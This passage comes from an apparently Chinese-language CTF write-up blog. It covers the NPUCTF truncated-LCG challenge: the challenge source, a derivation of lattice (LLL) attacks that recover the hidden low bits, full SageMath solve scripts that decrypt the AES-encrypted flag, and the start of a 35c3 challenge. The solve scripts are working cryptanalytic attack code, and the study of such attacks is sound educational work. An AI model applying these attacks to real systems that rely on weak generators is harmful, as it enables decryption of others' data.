class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bit_length</span>):</span></span><br><span class="line">        m = getPrime(bit_length)</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        b = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        seed = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        self._key = &#123;<span class="string">&#x27;a&#x27;</span>:a, <span class="string">&#x27;b&#x27;</span>:b, <span class="string">&#x27;m&#x27;</span>:m&#125;</span><br><span class="line">        self._state = seed </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._state = (self._key[<span class="string">&#x27;a&#x27;</span>] * self._state + self._key[<span class="string">&#x27;b&#x27;</span>]) % self._key[<span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_key</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_lcg</span>():</span></span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(key))</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_data</span>(<span class="params">rand_iter</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;old&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">rand_iter</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;ct&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    key = rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.<span class="built_in">next</span>() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.<span class="built_in">next</span>()).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = flag + (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(pt.encode())</span><br><span class="line">    f.write(ct)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = leak_data(rand_iter)</span><br><span class="line">    encrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#key</span></span><br><span class="line"><span class="string">&#123;&#x27;b&#x27;: 153582801876235638173762045261195852087, &#x27;a&#x27;: 107763262682494809191803026213015101802, &#x27;m&#x27;: 226649634126248141841388712969771891297&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#old</span></span><br><span class="line"><span class="string">7800489346663478448</span></span><br><span class="line"><span class="string">11267068470666042741</span></span><br><span class="line"><span class="string">5820429484185778982</span></span><br><span class="line"><span class="string">6151953690371151688</span></span><br><span class="line"><span class="string">548598048162918265</span></span><br><span class="line"><span class="string">1586400863715808041</span></span><br><span class="line"><span class="string">7464677042285115264</span></span><br><span class="line"><span class="string">4702115170280353188</span></span><br><span class="line"><span class="string">5123967912274624410</span></span><br><span class="line"><span class="string">8517471683845309964</span></span><br><span class="line"><span class="string">2106353633794059980</span></span><br><span class="line"><span class="string">11042210261466318284</span></span><br><span class="line"><span class="string">4280340333946566776</span></span><br><span class="line"><span class="string">6859855443227901284</span></span><br><span class="line"><span class="string">3149000387344084971</span></span><br><span class="line"><span class="string">7055653494757088867</span></span><br><span class="line"><span class="string">5378774397517873605</span></span><br><span class="line"><span class="string">8265548624197463024</span></span><br><span class="line"><span class="string">2898083382910841577</span></span><br><span class="line"><span class="string">4927088585601943730</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#ct十六进制显示</span></span><br><span class="line"><span class="string">00000000h: E0 E0 70 2C B7 D6 FC 19 AC E7 29 BE FC A4 0A F5 ; ààp,·Öü.¬ç)¾ü¤.õ</span></span><br><span class="line"><span class="string">00000010h: 01 23 F7 A6 ED E1 F3 AE 4B 3A 2A CD 7B 1D D8 37 ; .#÷¦íáó®K:*Í&#123;.Ø7</span></span><br><span class="line"><span class="string">00000020h: 14 73 10 58 86 AF D1 57 73 44 1F A0 6C 65 6A D6 ; .s.X.¯ÑWsD..lejÖ</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p>复现此题的契机是学习huangx师傅格密码中相关内容[1] 时所撞见，就此记录.</p></blockquote><p>读题后，知题目给出了LCG中$a、b、m$与20次迭代过程中每次结果的高位，然后取第21次结果高位与第22次结果低64位组成key，第23次结果组成了iv，且给出了AES加密后密文.</p><p>不难想到，要求解此题，只需恢复出任意一次迭代结果。换句话说，就是需要求出至少一组的低64位数据，就能恢复出所有数据了.</p><p>设低位为$d_i$, 给出的高位数据记为$s_i=s_i&lt;&lt;64$</p><p>为解决这个问题，我们看向如下迭代过程:<br>$$<br>\begin{aligned} s_1+d_1 &amp;= a•seed+b \mod m \\ s_2+d_2 &amp;= a•(s_1+d_1)+b \mod m \\ &amp;\vdots \\ s_n+d_n&amp;=a•(s_{n-1}+d_{n-1})+b \mod m\end{aligned}<br>$$<br>有：<br>$$<br>\begin{aligned} s_2 + d_2  &amp;= a(s_1+d_1)+b -km \\ d_2  &amp;= as_1+b-s_2 +ad_1-km \\ 记 C&amp;=as_1+b-s_2 \\ d_2  &amp;= ad_1-km+C\end{aligned}<br>$$<br>这里将杂七杂八的已知量总和一起记为C，是极有意义的.</p><p>一来帮助化简，使得式子简洁明了；二来，为之后构造格打下基础，避免格中元素过多，维度过高.</p><p>回到题目里，上式中，未知量仅为$d_2、d_1、k$.</p><p>而构造格子，依据的准则可以是$\vec v •M=\vec w$，其中把已知量都放入M中，未知量放到$\vec v$中，要求量放在$\vec w$中。若构造合理，在对M运行LLL算法后，就能得到$\vec w$.</p><p>$d_2$可以用$d_1$表达，根据下式:<br>$$<br>\begin{aligned} d_1 &amp;= d_1•1\\ d_2 &amp;=ad_1-km+C \end{aligned}<br>$$<br>有如下构造<br>$$<br>\left(\begin {array}{c} d_1&amp; -k &amp; 1 \end{array} \right)<br>\left(\begin {array}{c} 1 &amp; a &amp; x_1\newline 0 &amp; m &amp; x_2 \newline 0 &amp; C &amp; x_3 \end{array} \right)<br>=\left(\begin {array}{c} d_1&amp; d_2 &amp; ? \end{array} \right)<br>$$<br>对构造细节，有如下：</p><ul><li><p><strong>为什么能确定M是3x3？</strong></p><p>$d_2$表达式中a、m、C的存在，导致要表达出$d_2$至少需要3个位置</p></li><li><p><strong>x能随便填吗？</strong></p><p>不能，由MINKOWSKI THEOREM，我们知道最短向量需满足$\lambda_1(Λ) \leq \sqrt{n} • \sqrt[n]{det(Λ)}$</p><p>若格的行列式值较小，LLL所得结果就可能不是我们所预期的$\vec w$了</p><p>由对角线法，可得$det(Λ)=mx_3-Cx_2$</p><p>而为了让结果能校验且让最后一个数字尽可能地简单，$x_1、x_2$最好为0，结果则能固定为$x_3$,即:<br>$$<br>\left(\begin {array}{c} d_1&amp; -k &amp; 1 \end{array} \right)<br>\left(\begin {array}{c} 1 &amp; a &amp; 0\newline 0 &amp; m &amp; 0 \newline 0 &amp; C &amp; x_3 \end{array} \right)<br>=\left(\begin {array}{c} d_1&amp; d_2 &amp; x_3 \end{array} \right)<br>$$</p></li></ul><p>  可得$det(Λ)=mx_3$，让$x_3$尽可能取大些，会相比让$x_3$取小更有可能LLL出$\vec w$</p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a*s+b)%m</span><br><span class="line"></span><br><span class="line"><span class="comment">#key</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = <span class="number">7800489346663478448</span> &lt;&lt; <span class="number">64</span></span><br><span class="line">s2 = <span class="number">11267068470666042741</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">C = a*s1+b-s2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C =&quot;</span>, C)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x3 = <span class="number">9999999999999999999999</span></span><br><span class="line"></span><br><span class="line">M = matrix([[<span class="number">1</span>, a, <span class="number">0</span>], [<span class="number">0</span>, m, <span class="number">0</span>], [<span class="number">0</span>, C, x3]])</span><br><span class="line"><span class="built_in">print</span>(M.LLL())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221229192420815.png" alt="LLL"></p><p>后经验证，$d_1、d_2$正确，可求解出flag，完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a*s+b)%m</span><br><span class="line"></span><br><span class="line"><span class="comment">#key</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ct</span></span><br><span class="line">ct = <span class="string">&quot;e0e0702cb7d6fc19ace729befca40af50123f7a6ede1f3ae4b3a2acd7b1dd8371473105886afd15773441fa06c656ad6&quot;</span></span><br><span class="line">ct = <span class="string">b&#x27;&#x27;</span>.fromhex(ct)</span><br><span class="line"></span><br><span class="line">s1 = <span class="number">7800489346663478448</span> &lt;&lt; <span class="number">64</span> <span class="comment"># az</span></span><br><span class="line">s2 = <span class="number">11267068470666042741</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">C = a*s1+b-s2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C =&quot;</span>, C)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x3 = <span class="number">9999999999999999999999</span></span><br><span class="line"></span><br><span class="line">M = matrix([[<span class="number">1</span>, a, <span class="number">0</span>], [<span class="number">0</span>, m, <span class="number">0</span>], [<span class="number">0</span>, C, x3]]) <span class="comment"># -m</span></span><br><span class="line"><span class="built_in">print</span>(M.LLL())</span><br><span class="line"></span><br><span class="line">d1, d2 = M.LLL()[-<span class="number">1</span>][<span class="number">0</span>], M.LLL()[-<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">s1 += d1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    s1 = <span class="built_in">next</span>(s1)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">next</span>(s1) &gt;&gt; <span class="number">64</span></span><br><span class="line">key = (key &lt;&lt; <span class="number">64</span>) + (<span class="built_in">next</span>(<span class="built_in">next</span>(s1)) &gt;&gt; <span class="number">64</span>)</span><br><span class="line">key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">iv = long_to_bytes(<span class="built_in">next</span>(<span class="built_in">next</span>(<span class="built_in">next</span>(s1)))).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = cipher.decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># npuctf&#123;7ruc4t3d-L(G-4nd-LLL-4r3-1nt3r3st1ng&#125;</span></span><br></pre></td></tr></table></figure><p>正如huangx师傅所写道，这个格对数据大小要求严格，并<strong>不具备普适性</strong>.</p><p>笔者用题目代码生成另一组数据，却无法用此格正确规约出对应的$d_1、d_2$.</p><p>也确实，题目给了20组数据，仅用其中两组求解，注定了有其局限性.</p><h4 id="通解"><a href="#通解" class="headerlink" title="通解"></a>通解</h4><blockquote><p> 我们渴求通解，不避讳直觉，尽量严谨.</p></blockquote><p>有：<br>$$<br>\begin{aligned} s_1+d_1 &amp;= a•seed+b \mod m \\ s_2+d_2 &amp;= a(s_1+d_1)+b \mod m \\s_3+d_3 &amp;= a(s_2+d_2)+b \mod m \\s_4+d_4 &amp;= a(s_3+d_3)+b \mod m \\ &amp;\vdots \\ s_n+d_n&amp;=a(s_{n-1}+d_{n-1})+b \mod m\end{aligned}<br>$$<br>于是:<br>$$<br>\begin{aligned} s_3+d_3 &amp;= a(s_2+d_2)+b \\&amp;= a(a(s_1+d_1)+b)+b \\ &amp;= a^2d_1+a^2s_1+ab+b \mod m\\s_4+d_4 &amp;= a(s_3+d_3)+b \\ &amp;= a(a^2d_1+a^2s_1+ab+b )+b \\ &amp;= a^3d_1+a^3s_1+a^2b+ab+b \mod m \end{aligned}<br>$$<br>我们试着归纳出$s_k+d_k$与$a_1、d_1$的关系，有:<br>$$<br>\begin{aligned} s_k+d_k &amp;= a^{k-1}d_1+a^{k-1}s_1+b(a^{k-2}+a^{k-3}+···+1)\\ &amp;= a^{k-1}d_1+a^{k-1}s_1+b•\frac{a^{k-1}-1}{a-1} \mod m\\<br>d_k&amp;=a^{k-1}d_1+a^{k-1}s_1+b•\frac{a^{k-1}-1}{a-1}-s_k \\ &amp;=A_kd_1+B_k \mod m \\ &amp;=A_kd_1+B_k-K_im \end{aligned}<br>$$<br>把已知量总和一起记为$B_k$，方便后续构造.</p><p>值得注意的是，若<strong>已知量是在同余式中推出的</strong>，则应该<strong>对模取余</strong>.</p><p>这里为证实普适性，接下来笔者将用自己跑的数据来进行构造、求解.</p><p><strong>题目数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">128545450633871437429437241254781148160</span></span><br><span class="line">b=<span class="number">233389597015557833347401241174618011636</span></span><br><span class="line">m=<span class="number">315065305238616866744968219610334118613</span></span><br><span class="line">S = [<span class="number">7252977577629929975</span>, <span class="number">602943885393902321</span>, <span class="number">14518360259726210355</span>, <span class="number">6192947457464349552</span>, <span class="number">15019407963861094834</span>, <span class="number">14267673519450511986</span>, <span class="number">13311249722121495920</span>, <span class="number">4770531380593537313</span>, <span class="number">4016640960840138550</span>, <span class="number">7372256512820149548</span>, <span class="number">5309479576445491719</span>, <span class="number">8387322981994896008</span>, <span class="number">7719519419830748972</span>, <span class="number">14594645407993739304</span>, <span class="number">6422468239672604983</span>, <span class="number">16436109440098721169</span>, <span class="number">7623155229218776374</span>, <span class="number">5083416709024918086</span>, <span class="number">16792163486593697020</span>, <span class="number">14435467838685199929</span>]</span><br><span class="line">ct = <span class="string">&quot;8946eaf25a529e48f3f561ff8cba7cf9&quot;</span></span><br><span class="line">ct = <span class="string">b&#x27;&#x27;</span>.fromhex(ct)</span><br></pre></td></tr></table></figure><p><strong>构造格</strong></p><p>显然，这种思路下数据多，格的构造似乎变得复杂了起来.</p><p>但只要我们抓住准则$\vec v •M=\vec w$不松手，就能逐步构造出格.</p><p>由易到难，$\vec v •M=\vec w$中最好确定大部分元素的该是$\vec w$，往里面填充我们<strong>要求量</strong>即可， 如下：<br>$$<br>\vec w = \left(\begin {array}{c} d_1&amp; d_2 &amp; \cdots &amp; d_n \end{array} \right)<br>$$<br>接下来，根据关系$d_k =A_kd_1+B_k-K_im$, 便可以逐步确定$\vec v 、 M$.</p><p>根据<strong>未知量</strong>放入$\vec v$, 已知量放入$M$， 再由构造的习惯，有如下:<br>$$<br>\vec v = \left(\begin {array}{c} d_1&amp; 1 &amp;-K_1 &amp;-K_2&amp; \cdots &amp; -K_n \end{array} \right)<br>$$<br>那么$M$就很好确定了，如下：<br>$$<br>\left(\begin {array}{c} d_1&amp; 1 &amp;-K_1 &amp;-K_2&amp; \cdots &amp; -K_n \end{array}\right)<br>\left(\begin {array}{c} A_1 &amp; A_2 &amp; \cdots &amp; A_n\newline B_1 &amp; B_2 &amp; \cdots &amp; B_n \newline m \newline &amp;m \newline &amp;&amp; \ddots \newline &amp;&amp;&amp;m \end{array} \right)<br>=\left(\begin {array}{c} d_1&amp; d_2 &amp; \cdots &amp; d_n \end{array} \right)<br>$$<br>其中M为n x (n+2)矩阵.</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">A</span>(<span class="params">k</span>):</span> <span class="comment"># k从1开始</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, k-<span class="number">1</span>, m) <span class="comment"># 需要%m</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">B</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a^(k-<span class="number">1</span>)*S[<span class="number">1</span>]+b*(a^(k-<span class="number">1</span>)-<span class="number">1</span>)*<span class="built_in">int</span>(gmpy2.invert(a-<span class="number">1</span>, m))-S[k])%m <span class="comment"># 需要%m</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a*s+b)%m</span><br><span class="line"></span><br><span class="line">a=<span class="number">128545450633871437429437241254781148160</span></span><br><span class="line">b=<span class="number">233389597015557833347401241174618011636</span></span><br><span class="line">m=<span class="number">315065305238616866744968219610334118613</span></span><br><span class="line">S = [<span class="number">7252977577629929975</span>, <span class="number">602943885393902321</span>, <span class="number">14518360259726210355</span>, <span class="number">6192947457464349552</span>, <span class="number">15019407963861094834</span>, <span class="number">14267673519450511986</span>, <span class="number">13311249722121495920</span>, <span class="number">4770531380593537313</span>, <span class="number">4016640960840138550</span>, <span class="number">7372256512820149548</span>, <span class="number">5309479576445491719</span>, <span class="number">8387322981994896008</span>, <span class="number">7719519419830748972</span>, <span class="number">14594645407993739304</span>, <span class="number">6422468239672604983</span>, <span class="number">16436109440098721169</span>, <span class="number">7623155229218776374</span>, <span class="number">5083416709024918086</span>, <span class="number">16792163486593697020</span>, <span class="number">14435467838685199929</span>]</span><br><span class="line">ct = <span class="string">&quot;8946eaf25a529e48f3f561ff8cba7cf9&quot;</span></span><br><span class="line">ct = <span class="string">b&#x27;&#x27;</span>.fromhex(ct)</span><br><span class="line"></span><br><span class="line">S = [i&lt;&lt;<span class="number">64</span> <span class="keyword">for</span> i <span class="keyword">in</span> S]</span><br><span class="line">S = [<span class="string">&#x27;占位&#x27;</span>]+S</span><br><span class="line">M = matrix(<span class="built_in">len</span>(S)+<span class="number">1</span>,<span class="built_in">len</span>(S)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(S)):</span><br><span class="line">    <span class="comment"># 放A</span></span><br><span class="line">    M[<span class="number">0</span>,i-<span class="number">1</span>]=A(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 放B</span></span><br><span class="line">    M[<span class="number">1</span>,i-<span class="number">1</span>]=B(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 放m</span></span><br><span class="line">    M[i+<span class="number">1</span>,i-<span class="number">1</span>]=m</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> M.LLL():</span><br><span class="line">    s = S[<span class="number">1</span>]+<span class="built_in">abs</span>(line[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">next</span>(s)&gt;&gt;<span class="number">64</span>)==(S[<span class="number">2</span>]&gt;&gt;<span class="number">64</span>):</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    s = <span class="built_in">next</span>(s)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">next</span>(s) &gt;&gt; <span class="number">64</span></span><br><span class="line">key = (key &lt;&lt; <span class="number">64</span>) + (<span class="built_in">next</span>(<span class="built_in">next</span>(s)) &gt;&gt; <span class="number">64</span>)</span><br><span class="line">key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">iv = long_to_bytes(<span class="built_in">next</span>(<span class="built_in">next</span>(<span class="built_in">next</span>(s)))).ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = cipher.decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># flag&#123;123&#125;</span></span><br></pre></td></tr></table></figure><p><strong>更多</strong></p><p>当然，依据[2]、[3]， 我们还能构造满秩格子，便于验证与<a href="https://holocircuit.github.io/2019/01/08/unofficial.html">调整</a>.</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221230032346949.png" alt="More"></p><p><strong>TL;DR</strong></p><ol><li><p>为利用多组数据，我们需要找到各组之间的关系</p></li><li><p>为寻得能用来构造格的关系式， 思路是要定住$\vec v$，也即固定未知量，便能指导构造关系式</p><p>（本题中，表现为$d_i$都能用$d_1$表示，则固定未知量$d_1$，放入$\vec v$中，然后尝试把迭代式都用$d_1$，找规律以找到关系式来构造格）</p></li><li><p>确定关系式后，利用准则$\vec v •M=\vec w$，初步确定格的构成</p></li><li><p>（可选）将格补充为方阵，根据Bounds灵活调参</p></li><li><p>LLL求出要求量</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1] <a href="https://huangx607087.online/2021/02/06/LatticeNotes5/#toc-heading-11">https://huangx607087.online/2021/02/06/LatticeNotes5/#toc-heading-11</a></p><p>[2] <a href="https://blog.csdn.net/figfig55/article/details/128069624">https://blog.csdn.net/figfig55/article/details/128069624</a></p><p>[3] <a href="https://www.anquanke.com/post/id/204846#h3-3">https://www.anquanke.com/post/id/204846#h3-3</a></p><h2 id="35c3CTF2019-unofficial"><a href="#35c3CTF2019-unofficial" class="headerlink" title="35c3CTF2019[unofficial]"></a>35c3CTF2019[unofficial]</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, math, sys, binascii</span><br><span class="line">from secrets <span class="keyword">import</span> <span class="built_in">key</span>, flag</span><br><span class="line">from hashlib <span class="keyword">import</span> sha256</span><br><span class="line">from Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">21652247421304131782679331804390761485569</span></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">N = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # <span class="built_in">key</span> = keygen()   # generated once &amp; stored in secrets.py</span><br><span class="line">    challenge = keygen()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.<span class="built_in">join</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, challenge)))</span><br><span class="line">    response = <span 